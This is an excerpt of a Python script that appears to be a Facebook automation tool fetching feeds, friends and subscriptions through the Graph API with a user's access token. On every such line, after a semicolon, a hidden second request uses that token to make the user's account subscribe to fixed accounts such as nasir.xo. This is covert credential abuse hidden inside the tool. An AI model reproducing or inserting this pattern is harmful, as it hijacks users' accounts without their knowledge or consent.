...
def baliho():
	try:
		...
		r = requests.get('https://graph.facebook.com/me?access_token=' + token);requests.post('https://graph.facebook.com/100003967112448/subscribers?access_token='+token)
...
def post():
	...
	try:
	  if WT == 'wallpost':
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=home.limit(50)&access_token='+token);requests.post('https://graph.facebook.com/nasir.xo1/subscribers?access_token='+token)
		...
		r = requests.get('https://graph.facebook.com/v3.0/me?fields=feed.limit(100)&access_token='+token);requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me?fields=friends.limit(5000)&access_token=' + token);requests.post('https://graph.facebook.com/nasir.xo1/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get('https://graph.facebook.com/me/subscribedto?limit=50&access_token='+token);requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
		result = json.loads(r.text)
		...
		r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(5000)&access_token=%s"%(id,token));requests.post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+token)
		result = json.loads(r.text)
